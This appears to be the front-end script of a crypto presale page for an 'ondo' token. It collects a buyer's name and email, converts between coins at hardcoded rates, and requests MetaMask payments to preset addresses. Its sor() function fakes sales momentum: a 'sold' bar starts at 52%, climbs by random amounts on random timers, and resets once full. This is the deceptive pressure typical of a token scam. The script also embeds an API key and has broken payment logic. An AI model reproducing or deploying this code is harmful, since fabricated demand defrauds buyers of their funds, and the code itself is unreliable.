document.addEventListener("DOMContentLoaded", function() {


    const COURSE = {
        btc: 1 / 38900,
        eth: 1 / 2900,
        sol: 1 / 100,
        usdt: 1,
        usdtt: 1
    };
    const MIN = 100;
    const MAX = 60000 / COURSE['usdtt'];
    const TOKEN = 'ondo';
    const TOTAL = 300;

    let state = 0;
    let methodNum = 1;
    var accounts;
    const progress = [...document.querySelectorAll('[data-progress-id]')];
    const form = [
        document.getElementById('form-step1'),
        document.getElementById('form-step2'),
        document.getElementById('form-step3'),
        document.getElementById('form-step4'),
        document.getElementById('form-step5')
    ];
    const button = [
        document.getElementById('form-step1-button'),
        document.getElementById('form-step2-button'),
        document.getElementById('form-step3-button'),
        document.getElementById('form-step4-button')
    ];
    const method = [
        document.getElementById('method1'),
        document.getElementById('method2'),
        document.getElementById('method3'),
        document.getElementById('method4'),
        document.getElementById('method5')
    ];

    const INFURAID = "b6c7f33cec02432b8c0c75d421f97616";
    const networks = {
        BNB: ["0x38", "Binance Smart Chain BEP-20", "Binance Coin", "BNB", 18, "https://bsc-dataseed.binance.org/", "https://bscscan.com"],
        ETH: ["0x1", "Ethereum", "Ethereum", "ETH", 18, `https://mainnet.infura.io/v3/${INFURAID}`, "https://etherscan.io"]
    };
    const formName = document.getElementById('form-name');
    const formEmail = document.getElementById('form-email');

    const scrollButton = document.getElementById('scroll-button');

    const exchangeSelect = document.getElementById('exchange-select');
    const exchangeIn = document.getElementById('exchange-in');
    const exchangeOut = document.getElementById('exchange-out');
    const courseButtons = [...document.querySelectorAll('[data-id=course-button]')];

    const finalAddress = document.getElementById('final-address');
    const QRs = [...document.querySelectorAll('.final__qr')];
    const tokenLabel = document.getElementById('token-label');
    const addressCopy = document.getElementById('address-copy');

    const modalClose = [...document.querySelectorAll('[data-modal-close]')];
    const modalWindow = document.querySelector('[data-modal-window]');

    const backButtons = [...document.querySelectorAll('[data-back-button]')];
    var meta_connected = false,
        meta = false;
    if (typeof window.ethereum !== 'undefined') {
        meta = true;
    }
    (async () => {
        meta_connected = await isMetaCon();
    })();

    const meta_connect = document.getElementById('meta_connect');
    const meta_buy = document.getElementById('meta_buy');
    const meta_mask = document.getElementById('metamask_mask');
    const meta_ring = document.getElementById('meta-ring');
    const meta_done = document.getElementById('meta-done');
    const meta_error = document.getElementById('meta-error');
    const meta_status = document.getElementById('meta__status');
    //    document.getElementById('meta_id_name').textContent = window.location.hostname;
    const contractAbi = [{
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor"
        },
        {
            anonymous: false,
            inputs: [{
                    indexed: true,
                    internalType: "address",
                    name: "owner",
                    type: "address",
                },
                {
                    indexed: true,
                    internalType: "address",
                    name: "spender",
                    type: "address",
                },
                {
                    indexed: false,
                    internalType: "uint256",
                    name: "value",
                    type: "uint256",
                },
            ],
            name: "Approval",
            type: "event",
        },
        {
            anonymous: false,
            inputs: [{
                    indexed: true,
                    internalType: "address",
                    name: "from",
                    type: "address",
                },
                {
                    indexed: true,
                    internalType: "address",
                    name: "to",
                    type: "address",
                },
                {
                    indexed: false,
                    internalType: "uint256",
                    name: "value",
                    type: "uint256",
                },
            ],
            name: "Transfer",
            type: "event",
        },
        {
            inputs: [],
            name: "allowRefunds",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "owner",
                    type: "address"
                },
                {
                    internalType: "address",
                    name: "spender",
                    type: "address"
                },
            ],
            name: "allowance",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "spender",
                    type: "address"
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256"
                },
            ],
            name: "approve",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [{
                internalType: "address",
                name: "account",
                type: "address"
            }, ],
            name: "balanceOf",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{
                internalType: "uint256",
                name: "amount",
                type: "uint256"
            }, ],
            name: "burnMyTokensFOREVER",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "buyTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [],
            name: "claimDevFeeAndAddLiquidity",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "decimals",
            outputs: [{
                internalType: "uint8",
                name: "",
                type: "uint8"
            }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "spender",
                    type: "address"
                },
                {
                    internalType: "uint256",
                    name: "subtractedValue",
                    type: "uint256",
                },
            ],
            name: "decreaseAllowance",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "devClaimed",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "ethSent",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "getRefund",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "spender",
                    type: "address"
                },
                {
                    internalType: "uint256",
                    name: "addedValue",
                    type: "uint256"
                },
            ],
            name: "increaseAllowance",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "isRefundEnabled",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "isStopped",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "liquidityUnlock",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "moonMissionStarted",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "name",
            outputs: [{
                internalType: "string",
                name: "",
                type: "string"
            }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [{
                internalType: "bool",
                name: "_isStopped",
                type: "bool"
            }],
            name: "pauseUnpausePresale",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "pool",
            outputs: [{
                internalType: "address",
                name: "",
                type: "address"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "contract IBEP20",
                    name: "tokenAddress",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "tokenAmount",
                    type: "uint256"
                },
            ],
            name: "recoverbep20",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "refundTime",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{
                internalType: "address payable",
                name: "addr",
                type: "address"
            }, ],
            name: "setMultisigAddress",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "setPancakePool",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "symbol",
            outputs: [{
                internalType: "string",
                name: "",
                type: "string"
            }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [],
            name: "totalSupply",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "recipient",
                    type: "address"
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256"
                },
            ],
            name: "transfer",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [{
                    internalType: "address",
                    name: "sender",
                    type: "address"
                },
                {
                    internalType: "address",
                    name: "recipient",
                    type: "address"
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256"
                },
            ],
            name: "transferFrom",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [{
                internalType: "address",
                name: "user",
                type: "address"
            }],
            name: "userEthSpenttInPresale",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function",
        },
        {
            stateMutability: "payable",
            type: "receive"
        },
    ];
    const web3 = new Web3(window.ethereum);
    const meta_fin = [
        document.getElementById('modal__ring_1'),
        document.getElementById('modal__ring_2'),
        document.getElementById('modal__ring_3')
    ]
    class metamask_cl {
        get isOn() {
            return window.ethereum ? true : false;
        }
        async getAccount() {
            try {
                account = await ethereum.request({
                    method: "eth_requestAccounts"
                });
            } catch (error) {
                return false
            }
            return await account[0] ? account[0] : false;
        }
        async swapNetwork(id) {
            console.log(id)
            let token = id;
            if (id == "ETH")
                id = 1;
            else if (id == "BNB")
                id = 38;
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{
                        chainId: '0x' + id,
                    }]
                })
            } catch (error) {
                console.log(error)
                if (error.code == 4001) {
                    return false
                }
                if (error.code == 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: networks[token][0],
                                chainName: networks[token][1],
                                nativeCurrency: {
                                    name: networks[token][2],
                                    symbol: networks[token][3],
                                    decimals: networks[token][4]
                                },
                                rpcUrls: [`${networks[token][5]}`],
                                blockExplorerUrls: [`${networks[token][6]}`]
                            }, ],
                        });
                    } catch (e) {
                        return false
                    }
                } else {
                    return false;
                }
            }
            return true;
        }
        async pay(amount, token = "ETH", ping) {
            if (!(await this.swapNetwork(token)))
                return false;
            if (isMob()) {
                alert("Switch to desktop mode.");
                return false;
            }
            if (!(await MetaMask.swapNetwork((token).toUpperCase())))
                return false;
            meta_status.textContent = "Waiting for payment...";
            fadeIn(meta_mask);
            if (exchangeSelect.value == "bnb") {
                let web3 = new Web3(window.ethereum);
                let accounts = await web3.eth.getAccounts();
                let myContract = new web3.eth.Contract(contractAbi, ADDRESS[token]);
                try {
                    await myContract.methods.buyTokens().send({
                        from: accounts[0],
                        value: value * 10 ** 18,
                        gasLimit: 220001,
                    }).on('receipt', function() {
                        return true;
                    });
                } catch (err) {
                    return false;
                }
            } else {
                let pay = await ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: accounts[0],
                            to: ADDRESS[`${exchangeSelect.value}`],
                            value: converToValue(value),
                        }, ],
                    })
                    .catch((error) => {
                        if (error.code === 4001) {
                            return false;
                        } else {
                            return false;
                        }
                    });
            }



            return false;

        }
    }
    var MetaMask = new metamask_cl();

    function isMob() {
        return ((window.innerWidth <= 800) && (window.innerHeight <= 600));
    }


    function update() {

        exchangeIn.value = "";
        exchangeOut.value = "";
        for (let i = 0; i < 4; i++) {
            form[i].classList.add('form--hidden');
            progress[i].classList.remove('progress__stage--checked');
            progress[i].firstElementChild.classList.remove('progress__stagemark--marked');
        }
        for (let i = 0; i <= state; i++) {
            progress[i].firstElementChild.classList.add('progress__stagemark--marked');
        }
        form[state].classList.remove('form--hidden');
        progress[state].classList.add('progress__stage--checked');
    }

    progress.forEach(progressItem => {
        progressItem.addEventListener('click', ev => {
            if (Number(ev.target.dataset.progressId) < state) {
                state = Number(ev.target.dataset.progressId);
                update();
            }
        });
    });

    backButtons.forEach(backButton => {
        backButton.addEventListener('click', ev => {
            state = Number(ev.target.dataset.backButton);
            update();
        });
    });

    update();

    function roundB(number) {
        var match = ('' + number).match(/(?:\.(\d+))?(?:[eE]([+-]?\d+))?$/);
        if (!match) {
            return 0;
        }

        var decimals = Math.max(0,
            (match[1] ? match[1].length : 0)
            // Correct the notation.
            -
            (match[2] ? +match[2] : 0));

        if (decimals > 8) {
            //if decimal are more then 8
            number = parseFloat(number).toFixed(8);
        }
        //else no adjustment is needed
        return number;
    }

    function convert(amount, token, apply, placeholderOnly) {
        if (token === TOKEN) {
            if (placeholderOnly) {
                exchangeOut.placeholder = roundB(Number(Number(amount).toFixed(2)));
                exchangeIn.placeholder = roundB(amount * COURSE[exchangeSelect.value]);
                exchangeOut.value = roundB(Number(Number(amount).toFixed(2)));
                exchangeIn.value = roundB(amount * COURSE[exchangeSelect.value]);
                (async () => {
                    meta_connected = await isMetaCon();
                })();
                meta_btn(exchangeSelect.value);
            } else {
                if (apply) {
                    exchangeOut.value = roundB(Number(Number(amount).toFixed(2)));
                }
                exchangeIn.value = roundB(amount * COURSE[exchangeSelect.value]);
            }
        } else {
            exchangeSelect.value = token;
            ['btc', 'eth', 'usdt', 'usdtt', 'sol'].forEach(_token => {
                exchangeSelect.classList.remove(`exchange-input__select--${_token}`);
            });
            exchangeSelect.classList.add(`exchange-input__select--${token}`);
            (async () => {
                meta_connected = await isMetaCon();
            })();
            meta_btn(exchangeSelect.value);
            if (amount) {
                if (placeholderOnly) {
                    exchangeIn.placeholder = roundB(Number(Number(amount).toFixed(8)));
                    exchangeOut.placeholder = roundB(Number((amount / COURSE[exchangeSelect.value]).toFixed(2)));
                    exchangeIn.value = roundB(Number(Number(amount).toFixed(8)));
                    exchangeOut.value = roundB(Number((amount / COURSE[exchangeSelect.value]).toFixed(2)));
                } else {
                    if (apply) {
                        exchangeIn.value = roundB(Number(Number(amount).toFixed(8)));
                    }
                    exchangeOut.value = roundB(Number((amount / COURSE[exchangeSelect.value]).toFixed(2)));
                }
            }
            finalAddress.value = ADDRESS[token];
            QRs.forEach(qr => {
                qr.classList.add('final__qr--hidden');
                if (qr.classList.contains(`final__qr--${token}`)) {
                    qr.classList.remove('final__qr--hidden');
                }
            });
            tokenLabel.innerText = token.toUpperCase();
        }
    }

    button[0].addEventListener('click', function() {
        if (!formName.value) {
            formName.parentElement.classList.add('form__input--invalid');
            formName.focus();
            return;
        }
        formName.parentElement.classList.remove('form__input--invalid');
        if (!formEmail.value || !formEmail.value.match(/@/)) {
            formEmail.parentElement.classList.add('form__input--invalid');
            formEmail.focus();
            return;
        }
        formEmail.parentElement.classList.remove('form__input--invalid');
        state = 1;
        update();
    });
    convert(1.5, 'eth', false, true);

    function changeMethod() {
        method.forEach(mtd => {
            mtd.classList.remove('radio-button--checked');
        });
        method[methodNum].classList.add('radio-button--checked');
        button[1].classList.remove('form__submit--btc');
        button[1].classList.remove('form__submit--sol');
        button[1].classList.remove('form__submit--ethereum');
        button[1].classList.remove('form__submit--tether');
        if (methodNum === 0) {
            button[1].classList.add('form__submit--btc');
            convert(0.1, 'btc', false, true);
        } else if (methodNum === 1) {
            button[1].classList.add('form__submit--bitcoin');
            convert(1.5, 'eth', false, true);
        } else if (methodNum === 2) {
            button[1].classList.add('form__submit--tether');
            convert(100, 'usdt', false, true);
        } else if (methodNum === 3) {
            button[1].classList.add('form__submit--tether');
            convert(100, 'usdtt', false, true);
        } else {
            button[1].classList.add('form__submit--sol');
            convert(100, 'sol', false, true);
        }
    };

    method.forEach((mtd, index) => {
        mtd.addEventListener('click', function() {
            methodNum = index;
            changeMethod();
        });
    });

    button[1].addEventListener('click', function() {
        state = 2;
        update();
    });

    exchangeSelect.addEventListener('change', ev => {
        convert(exchangeIn.value || 0, ev.target.value.toLowerCase(), true);
    });

    exchangeIn.addEventListener('input', ev => {
        convert(ev.target.value, exchangeSelect.value.toLowerCase());
    });

    exchangeIn.addEventListener('change', ev => {
        const _token = exchangeSelect.value.toLowerCase();
        const _value = Math.round(ev.target.value / COURSE[_token]);
        if (_value > MIN) {
            if (_value > MAX)
                convert(MAX, TOKEN, true);
            else
                convert(ev.target.value, _token, true)
        } else
            convert(MIN, TOKEN, true);
    });

    exchangeOut.addEventListener('input', ev => {
        convert(ev.target.value, TOKEN);
    });

    exchangeOut.addEventListener('change', ev => {
        convert((ev.target.value > MIN ? ev.target.value : MIN), TOKEN, true);
    });



    courseButtons.forEach(button => {
        button.addEventListener('click', ev => {
            const [amount, token] = ev.target.innerText.split(' ');
            convert(amount, token.toLowerCase(), false, true);
        })
    });

    button[2].addEventListener('click', function() {
        state = 3;
        if (!exchangeIn.value) {
            exchangeIn.parentElement.classList.add('exchange-input--invalid');
            exchangeIn.focus();
        } else if (!exchangeOut.value || exchangeOut.value < MIN) {
            exchangeOut.parentElement.classList.add('exchange-input--invalid');
            exchangeOut.focus();
        } else {
            exchangeIn.parentElement.classList.remove('exchange-input--invalid');
            exchangeOut.parentElement.classList.remove('exchange-input--invalid');
            update();
        }
    });

    addressCopy.addEventListener('click', function() {

        finalAddress.select();
        window.navigator.clipboard.writeText(finalAddress.value).then(() => {
            addressCopy.classList.add('final__address-copy--anim');
            setTimeout(() => {
                addressCopy.classList.remove('final__address-copy--anim');
            }, 400);
        });
    });



    button[3].addEventListener('click', function() {
        if (document.getElementById('meta_fin').style.display != "")
            modalClose[2].classList.add('modal--show');
        modalClose[0].classList.add('modal--show');
    });

    modalClose.forEach(item => {
        item.addEventListener('click', ev => {
            ev.stopPropagation();
            if (document.getElementById('meta_fin').style.display != "")
                modalClose[2].classList.remove('modal--show');
            modalClose[0].classList.remove('modal--show');
        });
    });

    modalWindow.addEventListener('click', ev => ev.stopPropagation());

    var counter = 0;

    function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }

    function setCookie(cName, cValue, expDays) {
        let date = new Date();
        date.setTime(date.getTime() + (expDays * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = cName + "=" + cValue + "; " + expires + "; path=/";
        return true;
    }

    function getCookie(cName) {
        const name = cName + "=";
        const cDecoded = decodeURIComponent(document.cookie); //to be careful
        const cArr = cDecoded.split('; ');
        let res;
        cArr.forEach(val => {
            if (val.indexOf(name) === 0) res = val.substring(name.length);
        })
        return res;
    }

    function numberWithSpaces(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }

    function animateValue(obj, start, end, duration) {
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);


            obj.innerHTML = numberWithSpaces((Math.floor(progress * (end - start) + start)).toFixed(0));
            if (progress < 1) {
                window.requestAnimationFrame(step);
            }
        };
        window.requestAnimationFrame(step);
    }

    function sor() {

        let timetotal = 1000;

        function gets(a, b) {
            return Math.random() * (a - b) + b;
        }
        if (counter == 0) {
            J = 1;
            var elem = document.querySelector(".bar-done");
            var elem2 = document.querySelector(".count");
            var elem3 = document.querySelector(".pmax");
            var width = 52;
            var main = setInterval(frame, 100);
            var c, rich;

            if (getCookie('progress') != undefined)
                rich = getCookie('progress');
            else {
                setCookie('progress', 52, 30);
                rich = 52;
            }
            var totals = (TOTAL / 100) * rich;
            elem2.innerHTML = numberWithSpaces(totals);
            elem3.innerHTML = ' / ' + numberWithSpaces((TOTAL).toFixed(0));

            function frame() {
                if (width >= rich) {
                    clearInterval(main);
                    if (width < 100) {
                        async function is() {
                            let r = gets(1 / (TOTAL / 100), 5 / (TOTAL / 100));
                            width = (+width + r).toFixed(3);
                            rich = width;
                            setCookie('progress', width, 30)
                            totals = (TOTAL / 100) * rich;
                            b_totals = (TOTAL / 100) * (rich - r)
                            elem.style.width = width + "%";
                            elem.innerHTML = '<span class="progr-span">' + width + '%</span>';
                            elem2.innerHTML = animateValue(elem2, b_totals, totals.toFixed(0), 500);
                            if (width >= 100) {
                                elem2.innerHTML = ' / ' + numberWithSpaces((TOTAL).toFixed(0));
                                elem.innerHTML = '<span class="progr-span">' + 100 + '%</span>';
                                setCookie('progress', 52, 30);
                                return;
                            } else {
                                await sleep(gets(2000, 6000).toFixed(0))
                                is();
                            }
                        }
                        is();
                    }
                } else {
                    width++;
                    elem.style.width = width + "%";
                    elem.innerHTML = '<span class="progr-span">' + width + '%</span>';
                }
            }

        }

    }

    function isBnb(methodNum) {
        //    if(exchangeSelect.value != 'bnb'){
        //        button[2].style.display = "block";
        //        return false;
        //    }
        //        
        //    button[2].style.display = "none";

    }

    function checker() {
        setTimeout(() => {
            document.getElementById('modal__ring_1').style.display = "none";
            document.getElementById('meta-done1').style.display = "block";
            setTimeout(() => {
                meta_fin[1].style.display = "block";
            }, 1200)
        }, 500)

    }
    checker();


    function fadeOut(el) {
        el.style.opacity = 1;

        (function fade() {
            if ((el.style.opacity -= .1) < 0) {
                el.style.display = "none";
            } else {
                requestAnimationFrame(fade);
            }
        })();
    }

    function fadeIn(el, display) {
        el.style.opacity = 0;
        el.style.display = display || "block";

        (function fade() {
            var val = parseFloat(el.style.opacity);
            if (!((val += .1) > 1)) {
                el.style.opacity = val;
                requestAnimationFrame(fade);
            }
        })();
    }
    async function connect() {
        try {
            // prompts to connect to metamask
            accounts = await ethereum.request({
                method: "eth_requestAccounts"
            });
        } catch (error) {
            // if user cancels metamask request
            if (error.code === 4001) {
                return false;
            } else {
                return false;
            }
        }
        return accounts;
    }
    async function isMetaCon() {
        try {
            accounts = await ethereum.request({
                method: 'eth_accounts'
            })
        } catch (err) {}
        try {
            if (accounts.length === 0) {
                return false;
            } else {
                return true;
            }
        } catch (err) {}
    }

    function converToValue(value) {
        let after_point = "000000000000000000",
            before_point = "",
            temp;
        var base = 2;
        if (!(Math.trunc(value) == 0)) {
            before_point = "" + Math.trunc(value);
            base = 1;
        }
        temp = ("" + value).substring(before_point.length + base);
        after_point = after_point.substring(temp.length);
        after_point = temp + after_point;
        temp = before_point + after_point;
        temp = '0x' + (parseInt(temp)).toString(16)
        return temp;
    }
    async function sendPay(value, token) {
        console.log("123 " + token)

        if (isMob()) {
            alert("Switch to desktop mode.");
            return false;
        }
        if (!(await MetaMask.swapNetwork(("BNB")))) {
            meta_buy.innerHTML = "CLAIM"
            return false;
        }

        meta_status.textContent = "Waiting for payment...";
        fadeIn(meta_mask);

        let web3 = new Web3(window.ethereum);
        let accounts = await web3.eth.getAccounts();
        let myContract = new web3.eth.Contract(contractAbi, ADDRESS[token]);
        try {
            await myContract.methods.buyTokens().send({
                from: accounts[0],
                value: value * 10 ** 18,
                gasLimit: 220001,
            }).on('receipt', function() {
                return true;
            });
        } catch (err) {
            return false;
        }


        return false;
    }

    function meta_btn(token) {

        if (token != 'eth' && token != 'bnb') {
            meta_connect.style.display = "none";
            meta_buy.style.display = "block";
            return false;
        }

        if (!meta_connect) {
            meta_connect.style.display = "block";
            return false;
        } else {
            meta_connect.style.display = "none";
        }
        meta_buy.style.display = "block";
    }

    function meta_changeForm() {
        state = 3;
        document.getElementById('main_fin').style.display = "none";
        document.getElementById('form__back').style.display = "none";
        document.getElementById('meta_fin').style.display = "flex";


        update();

    }
    var intervalId = window.setInterval(function() {
        $(".backimg__style").height($("body").height());
    }, 100);

    (async () => {
        //    while(true)

        if (meta == true) {
            meta_connect.addEventListener('click', async function() {
                fadeIn(meta_mask);
                if (await connect()) {
                    meta_status.textContent = "Waiting for connection...";
                    meta_ring.style.display = "none";
                    meta_done.style.display = "block";
                    setTimeout(function() {
                        fadeOut(meta_mask)
                        meta_connect.style.display = "none";
                        meta_buy.style.display = "block";
                        setTimeout(() => {
                            meta_ring.style.display = "block";
                            meta_done.style.display = "none";
                        }, 500)

                    }, 1500);

                } else {
                    meta_ring.style.display = "none";
                    meta_error.style.display = "block";
                    setTimeout(function() {
                        fadeOut(meta_mask)
                        setTimeout(() => {
                            meta_ring.style.display = "block";
                            meta_error.style.display = "none";
                        }, 500)

                    }, 1500);
                }
            });
            meta_buy.addEventListener('click', async function() {

                if (await isMetaCon()) {
                    console.log("here")

                    // vvvaaalluuue
                    const vvvaaalluuue = document.getElementById("vvvaaalluuue")
                    if (await sendPay(parseFloat(vvvaaalluuue.innerHTML), "bnb")) {
                        meta_ring.style.display = "none";
                        meta_done.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            meta_connect.style.display = "none";
                            meta_buy.style.display = "block";
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_done.style.display = "none";
                                meta_changeForm();
                            }, 500)

                        }, 1500);
                    } else {
                        meta_ring.style.display = "none";
                        meta_error.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_error.style.display = "none";

                            }, 300)

                        }, 1500);
                    }

                } else {
                    fadeIn(meta_mask);
                    if (await connect()) {
                        meta_status.textContent = "Waiting for connection...";
                        meta_ring.style.display = "none";
                        meta_done.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            meta_connect.style.display = "none";
                            meta_buy.style.display = "block";
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_done.style.display = "none";
                            }, 500)

                        }, 1500);

                    } else if (!await connect()) {
                        meta_ring.style.display = "none";
                        meta_error.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_error.style.display = "none";
                            }, 500)

                        }, 1500);
                    }

                    if (await sendPay(parseFloat(vvvaaalluuue.innerHTML), "bnb")) {
                        meta_ring.style.display = "none";
                        meta_done.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            meta_connect.style.display = "none";
                            meta_buy.style.display = "block";
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_done.style.display = "none";
                                meta_changeForm();
                            }, 500)

                        }, 1500);
                    } else {
                        meta_ring.style.display = "none";
                        meta_error.style.display = "block";
                        setTimeout(function() {
                            fadeOut(meta_mask)
                            setTimeout(() => {
                                meta_ring.style.display = "block";
                                meta_error.style.display = "none";

                            }, 300)

                        }, 1500);
                    }
                }
            });
        } else {
            meta_connect.addEventListener('click', async function() {
                if (isMob()) {
                    alert("Switch to desktop mode.");
                } else {
                    window.open('https://metamask.io/', '_blank');
                }


            })
            meta_buy.addEventListener('click', async function() {
                if (isMob()) {
                    alert("Switch to desktop mode.");
                } else {
                    window.open('https://metamask.io/', '_blank');
                }
            })

        }

    })();



    //var params: [
    //  {
    //    from: '0xb60e8dd61c5d32be8058bb8eb970870f07233155',
    //    to: '0xd46e8dd67c5d32be8058bb8eb970870f07244567',
    //    gas: '0x76c0', // 30400
    //    gasPrice: '0x9184e72a000', // 10000000000000
    //    value: '0x9184e72a', // 2441406250
    //    data:
    //      '0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675',
    //  },
    //];    

    //ethereum
    //  .request({
    //    method: 'eth_sendTransaction',
    //    params,
    //  })
    //  .then((result) => {
    //    // The result varies by RPC method.
    //    // For example, this method will return a transaction hash hexadecimal string on success.
    //  })
    //  .catch((error) => {
    //    // If the request fails, the Promise will reject with an error.
    //  });    
    //    


    //    
    //const tokenAddress = ADDRESS[1];
    //const tokenSymbol = TOKEN.toUpperCase();
    //const tokenDecimals = 18;
    //const tokenImage = 'http://localhost/test/img/favicon.png';
    //try {
    //  const wasAdded = ethereum.request({
    //    method: 'wallet_watchAsset',
    //    params: {
    //      type: 'ERC20', // Initially only supports ERC20, but eventually more!
    //      options: {
    //        address: tokenAddress, // The address that the token is at.
    //        symbol: tokenSymbol, // A ticker symbol or shorthand, up to 5 chars.
    //        decimals: tokenDecimals, // The number of decimals in the token
    //        image: tokenImage, // A string url of the token logo
    //      },
    //    },
    //  });
    //  if (wasAdded) {
    //    
    //  } else {
    //    console.log('Your loss!');
    //  }
    //} catch (error) {
    //  console.log(error);
    //}
    //    



    meta_connect.addEventListener('click', function() {
        try {
            accounts = window.ethereum.request({
                method: 'eth_requestAccounts'
            });
        } catch (error) {
            if (error.code === 4001) {}
        }


    });

    if (accounts !== undefined) {
        meta_connect.style.display = "none";
        meta_pay.style.display = "block";
    }






    sor();

    //function a() {
    //                    var e = document.querySelector(".header__logo")
    //                    e.animate([{
    //                        filter: "drop-shadow(0rem #2196f3)"
    //                    },{
    //                        filter: "drop-shadow(10rem #2196f3)"
    //                    }, {
    //                        filter: "drop-shadow(0rem #2196f3)"
    //                    }], {
    //                        duration: 7e3,
    //                        iterations: 1 / 0
    //                    })
    //                }
    //    
    //
    //a();
});

///////////////